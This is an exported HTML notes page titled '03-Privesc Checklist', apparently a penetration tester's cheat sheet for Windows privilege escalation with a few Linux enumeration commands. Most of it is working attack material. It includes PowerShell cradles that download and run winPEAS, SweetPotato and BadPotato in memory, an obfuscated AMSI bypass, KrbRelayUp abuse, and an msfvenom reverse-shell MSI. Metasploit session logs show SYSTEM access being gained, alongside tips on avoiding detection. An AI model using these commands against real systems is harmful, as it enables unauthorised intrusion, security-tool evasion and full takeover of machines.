<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>03-Privesc Checklist</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>03-Privesc Checklist</h1><br/><p><h2>Privesc</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># winpeas without touching the disk</span><br /><br /><span style="color:#0088ff;font-weight:400">$data</span><span style="color:#ff9d00;font-weight:700">=</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/winPEASany_ofs.exe&#39;</span>);<br /><span style="color:#0088ff;font-weight:400">$asm</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Reflection.Assembly]<span style="color:#ff9d00;font-weight:700">::</span>Load([<span style="color:#7f0044;font-weight:400">byte</span>[]]<span style="color:#0088ff;font-weight:400">$data</span>);<br /><span style="color:#0088ff;font-weight:400">$out</span> <span style="color:#ff9d00;font-weight:700">=</span> [Console]<span style="color:#ff9d00;font-weight:700">::</span>Out;<span style="color:#0088ff;font-weight:400">$sWriter</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> IO.StringWriter;[Console]<span style="color:#ff9d00;font-weight:700">::</span>SetOut(<span style="color:#0088ff;font-weight:400">$sWriter</span>);<br />[winPEAS.Program]<span style="color:#ff9d00;font-weight:700">::</span>Main(<span style="color:#3ad900;font-weight:400">&quot;&quot;</span>);[Console]<span style="color:#ff9d00;font-weight:700">::</span>SetOut(<span style="color:#0088ff;font-weight:400">$out</span>);<span style="color:#0088ff;font-weight:400">$sWriter</span>.ToString()<br /><span style="color:#0088ff;font-weight:400">## if u have a real shell just do </span><br />[winPEAS.Program]<span style="color:#ff9d00;font-weight:700">::</span>Main(<span style="color:#3ad900;font-weight:400">&quot;&quot;</span>);<br /><br /><span style="color:#0088ff;font-weight:400"># another method without compiling </span><br /><span style="color:#ff9d00;font-weight:700">iex</span>(<span style="color:#ff9d00;font-weight:700">new-object</span> net.webclient).downloadstring(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1&#39;</span>)<br />PowerSharpPack <span style="color:#ff9d00;font-weight:700">-</span>winPEAS<br /><br /><span style="color:#0088ff;font-weight:400"># exploit seimpersonate privilege sweetpotato</span><br />https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>CCob<span style="color:#ff9d00;font-weight:700">/</span>SweetPotato<br />mkdir c<span style="color:#ff9d00;font-weight:700">:\</span>temp<br /><span style="color:#ff9d00;font-weight:700">cd</span> c<span style="color:#ff9d00;font-weight:700">:\</span>temp<br />(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadFile(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/runme.bat&#39;</span>,<span style="color:#333333;font-weight:400">&#39;c:\temp\runme.bat&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$data</span><span style="color:#ff9d00;font-weight:700">=</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/SweetPotato.exe&#39;</span>);<br /><span style="color:#0088ff;font-weight:400">$asm</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Reflection.Assembly]<span style="color:#ff9d00;font-weight:700">::</span>Load([<span style="color:#7f0044;font-weight:400">byte</span>[]]<span style="color:#0088ff;font-weight:400">$data</span>);<br /><span style="color:#0088ff;font-weight:400">$out</span> <span style="color:#ff9d00;font-weight:700">=</span> [Console]<span style="color:#ff9d00;font-weight:700">::</span>Out;<span style="color:#0088ff;font-weight:400">$sWriter</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> IO.StringWriter;[Console]<span style="color:#ff9d00;font-weight:700">::</span>SetOut(<span style="color:#0088ff;font-weight:400">$sWriter</span>);<br />[SweetPotato.Program]<span style="color:#ff9d00;font-weight:700">::</span>Main(@(<span style="color:#333333;font-weight:400">&#39;-p=C:\temp\runme.bat&#39;</span>));[Console]<span style="color:#ff9d00;font-weight:700">::</span>SetOut(<span style="color:#0088ff;font-weight:400">$out</span>);<span style="color:#0088ff;font-weight:400">$sWriter</span>.ToString()<br /><span style="color:#0088ff;font-weight:400">## sweet potato with no compilation</span><br /><span style="color:#0088ff;font-weight:400">$x</span><span style="color:#ff9d00;font-weight:700">=</span>[Ref].Assembly.GetType(<span style="color:#333333;font-weight:400">&#39;System.Management.Automation.Am&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;siUt&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;ils&#39;</span>);<span style="color:#0088ff;font-weight:400">$y</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$x</span>.GetField(<span style="color:#333333;font-weight:400">&#39;am&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;siCon&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;text&#39;</span>,[Reflection.BindingFlags]<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>);<span style="color:#0088ff;font-weight:400">$z</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$y</span>.GetValue(<span style="color:#0088ff;font-weight:400">$null</span>);[Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>WriteInt32(<span style="color:#0088ff;font-weight:400">$z</span>,<span style="color:#333333;font-weight:400">0x41424344</span>)<br /><span style="color:#ff9d00;font-weight:700">iex</span>(<span style="color:#ff9d00;font-weight:700">new-object</span> system.net.webclient).downloadstring(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/amsi_rmouse.txt&#39;</span>)<br /><span style="color:#ff9d00;font-weight:700">iex</span>(<span style="color:#ff9d00;font-weight:700">new-object</span> net.webclient).downloadstring(<span style="color:#333333;font-weight:400">&#39;http://192.168.56.1:8080/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1&#39;</span>)<br /><span style="color:#00117f;font-weight:400">Invoke-BadPotato</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#3ad900;font-weight:400">&quot;c:\temp\runme.bat&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># krbrelayUP</span><br /> netexec ldap <span style="color:#0088ff;font-weight:400">$targets</span> <span style="color:#ff9d00;font-weight:700">-</span>u <span style="color:#0088ff;font-weight:400">$user</span> <span style="color:#ff9d00;font-weight:700">-</span>p <span style="color:#0088ff;font-weight:400">$password</span> <span style="color:#ff9d00;font-weight:700">-</span>d <span style="color:#0088ff;font-weight:400">$domain</span> <span style="color:#ff9d00;font-weight:700">-</span>M <span style="color:#00117f;font-weight:400">ldap-signing</span><br /> <span style="color:#0088ff;font-weight:400">## exploit krbrelayUp (https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/)</span><br /> KrbRelayUp.exe full <span style="color:#ff9d00;font-weight:700">-</span>Domain corp.local <span style="color:#ff9d00;font-weight:700">--</span>CreateNewComputerAccount <span style="color:#ff9d00;font-weight:700">--</span>ComputerName FakeMachine01$ <span style="color:#ff9d00;font-weight:700">--</span>ComputerPassword passw@rd123<br /> <br /> <span style="color:#0088ff;font-weight:400">## check inetpub </span><br /> <span style="color:#0088ff;font-weight:400">### if we can write =&gt; write aspx webshell =&gt; seimperonstae to get admin</span><br /> <br /> <span style="color:#0088ff;font-weight:400">## check installed programs</span><br /> c<span style="color:#ff9d00;font-weight:700">:\</span>programdata (view hidden ) <br /> <br /> <span style="color:#0088ff;font-weight:400">## detect proxy</span><br /> [System.Net.WebProxy]<span style="color:#ff9d00;font-weight:700">::</span>GetDefaultProxy()</pre></div></p><p></p><p></p><p></p><p><strong><h2>Always Install Elevated</h2></strong></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># identify </span><br />reg query HKLM<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Installer <span style="color:#ff9d00;font-weight:700">/</span>v AlwaysInstallElevated<br /><br />reg query HKCU<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Installer <span style="color:#ff9d00;font-weight:700">/</span>v AlwaysInstallElevated <br /><span style="color:#0088ff;font-weight:400"># method 1: </span><br />create your own MSI package <br />https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>KINGSABRI<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">MSI-AlwaysInstallElevated</span><br /><br /><span style="color:#0088ff;font-weight:400"># create package via msfvenom</span><br />msfvenom <span style="color:#ff9d00;font-weight:700">--</span>platform windows <span style="color:#ff9d00;font-weight:700">--</span>arch x64 <span style="color:#ff9d00;font-weight:700">--</span>payload windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">10.0</span>.<span style="color:#333333;font-weight:400">2.4</span> LPORT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1337</span> <span style="color:#ff9d00;font-weight:700">--</span>encoder x64<span style="color:#ff9d00;font-weight:700">/</span>xor <span style="color:#ff9d00;font-weight:700">--</span>iterations <span style="color:#333333;font-weight:400">9</span> <span style="color:#ff9d00;font-weight:700">--</span>format msi <span style="color:#ff9d00;font-weight:700">--</span>out AlwaysInstallElevated.msi<br /><br /><span style="color:#0088ff;font-weight:400">## method 3 meterpreteer </span><br />exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated<br /><span style="color:#0088ff;font-weight:400">### u need to tweek it to not get flagged </span><br /><span style="color:#0088ff;font-weight:400">### disable default listener </span><br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter_OR_WHATEVER_YOU_COMPILED<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST tun0<br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; <span style="color:#ff9d00;font-weight:700">set</span> LPORT <span style="color:#333333;font-weight:400">443</span><br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; <span style="color:#ff9d00;font-weight:700">set</span> ExitOnSession false<br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; run <span style="color:#ff9d00;font-weight:700">-</span>j <span style="color:#ff9d00;font-weight:700">-</span>z<br /><span style="color:#0088ff;font-weight:400"># Here, run TWICE the met.exe to make sure that the handler doesn&#39;t stop after first incoming session, otherwise you will wonder why it doesn&#39;t work...</span><br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; jobs<br />Jobs<br /><span style="color:#ff9d00;font-weight:700">====</span><br />  Id  Name                    Payload                          Payload opts<br />  <span style="color:#ff9d00;font-weight:700">--</span>  <span style="color:#ff9d00;font-weight:700">----</span>                    <span style="color:#ff9d00;font-weight:700">-------</span>                          <span style="color:#ff9d00;font-weight:700">------------</span><br />  <span style="color:#333333;font-weight:400">1</span>   Exploit<span style="color:#ff9d00;font-weight:700">:</span> multi<span style="color:#ff9d00;font-weight:700">/</span>handler  windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp  tcp<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.X.Y<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">443</span><br /><br />msf6 exploit(multi<span style="color:#ff9d00;font-weight:700">/</span>handler) &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated<br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; <span style="color:#ff9d00;font-weight:700">set</span> VERBOSE true<br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>exec<br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; <span style="color:#ff9d00;font-weight:700">set</span> session <span style="color:#333333;font-weight:400">1</span><br /><br /><span style="color:#0088ff;font-weight:400"># We can first try with encoded Powershell command, here &#39;whoami &gt; C:\whoami.txt&#39;</span><br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; <span style="color:#ff9d00;font-weight:700">set</span> cmd <span style="color:#333333;font-weight:400">&#39;powershell -enc dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAdwBoAG8AYQBtAGkALgB0AHgAdAA=&#39;</span><br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; run<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Uploading the MSI to C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>user<span style="color:#ff9d00;font-weight:700">\</span>AppData<span style="color:#ff9d00;font-weight:700">\</span>Local<span style="color:#ff9d00;font-weight:700">\</span>Temp<span style="color:#ff9d00;font-weight:700">\</span>uDBjvv.msi ...<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Executing MSI...<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Exploit completed, but no session was created.<br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; sessions <span style="color:#333333;font-weight:400">1</span><br />[<span style="color:#ff9d00;font-weight:700">*</span>] Starting interaction with <span style="color:#333333;font-weight:400">1</span>...<br />meterpreter &gt; <span style="color:#ff9d00;font-weight:700">cat</span> C<span style="color:#ff9d00;font-weight:700">:/</span>whoami.txt<br />��nt authority<span style="color:#ff9d00;font-weight:700">\</span>system<br />meterpreter &gt; <br />Background session <span style="color:#333333;font-weight:400">1</span><span style="color:#ff9d00;font-weight:700">?</span> [y<span style="color:#ff9d00;font-weight:700">/</span>N]  <br /><br /><span style="color:#0088ff;font-weight:400"># Here we run the Meterpreter payload</span><br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; <span style="color:#ff9d00;font-weight:700">set</span> cmd <span style="color:#333333;font-weight:400">&#39;C:\met.exe&#39;</span><br />sf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt; run<br /><br />[<span style="color:#ff9d00;font-weight:700">*</span>] Uploading the MSI to C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>user<span style="color:#ff9d00;font-weight:700">\</span>AppData<span style="color:#ff9d00;font-weight:700">\</span>Local<span style="color:#ff9d00;font-weight:700">\</span>Temp<span style="color:#ff9d00;font-weight:700">\</span>uBnecgivVWuR.msi ...<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Executing MSI...<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Sending stage (<span style="color:#333333;font-weight:400">175174</span> bytes) to <span style="color:#333333;font-weight:400">192.168</span>.X.Y<br />[<span style="color:#ff9d00;font-weight:700">*</span>] Meterpreter session <span style="color:#333333;font-weight:400">2</span> opened (<span style="color:#333333;font-weight:400">192.168</span>.X.Y<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">443</span> <span style="color:#ff9d00;font-weight:700">-</span>&gt; <span style="color:#333333;font-weight:400">192.168</span>.Z.Z<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">49798</span> ) at <span style="color:#00117f;font-weight:400">2022-06-03</span> <span style="color:#333333;font-weight:400">21</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">29</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">45</span> <span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">0200</span><br /><br />[<span style="color:#ff9d00;font-weight:700">*</span>] Exploit completed, but no session was created.<br />msf6 exploit(windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>always_install_elevated) &gt;<br /><br /><br /><br /><br /></pre></div></p><p></p><p></p><p><strong><h2>Some linux notes</h2></strong></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># listen on network </span><br />sudo tcpdump <span style="color:#ff9d00;font-weight:700">-</span>i <span style="color:#0088ff;font-weight:400">$interface</span> <br /><br /><span style="color:#0088ff;font-weight:400">## list service </span><br />systemctl <span style="color:#ff9d00;font-weight:700">--type=</span>service<br /><span style="color:#0088ff;font-weight:400">## connect to mongo db </span><br />mongo <span style="color:#3ad900;font-weight:400">&quot;mongodb://$target:27017/$service&quot;</span><br /><span style="color:#0088ff;font-weight:400">### enumerate mongo</span><br />show dbs <br />use <span style="color:#0088ff;font-weight:400">$db</span> <br />show collections<br />db.<span style="color:#0088ff;font-weight:400">$collection</span>.find()<br /><br /><span style="color:#0088ff;font-weight:400">## search exposed smb shared </span><br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>samba<span style="color:#ff9d00;font-weight:700">/</span>smb.conf</pre></div></p></div>
</body>
</html>
